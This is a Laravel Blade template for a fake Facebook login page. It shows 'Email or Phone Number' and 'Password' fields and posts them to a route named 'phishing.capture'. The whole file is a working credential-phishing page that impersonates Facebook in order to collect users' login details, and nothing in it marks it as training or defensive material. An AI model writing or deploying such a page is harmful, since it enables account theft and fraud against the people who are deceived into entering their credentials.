<!DOCTYPE html>
<html lang="{{ str_replace('_', '-', app()->getLocale()) }}">
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">

        <title>Facebook login</title>

        <style>
            body{
                font-family:Arial, sans-serif;
                background: white;
                text-align:center;
            }
            .container
            {
                width:300px;
                margin:auto;
                margin-top:100px;
                background:white;
                padding:20px;
                border-radius: 8px;
            }
            input{
                width:100%;
                padding:10px;
                margin:5px;
                border: 1px solid white;
                border_radius:5px;
            }
            button{
                width: 100%;
                background:blue;
                color: white;
                padding:10px;
                border: none; border-radius:5px
            }
            button:hover
            {
                background:blue;
            }
        </style>

    </head>
    <body>
     <div class="container">
        <h2>Facebook</h2>
        <form action="{{route(name: 'phishing.capture')}}" method="POST">
            @csrf
            <input type="text" name="email" placeholder="Email or Phone Number" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Login</button>

        </form>
        </div>
    </body>
</html>

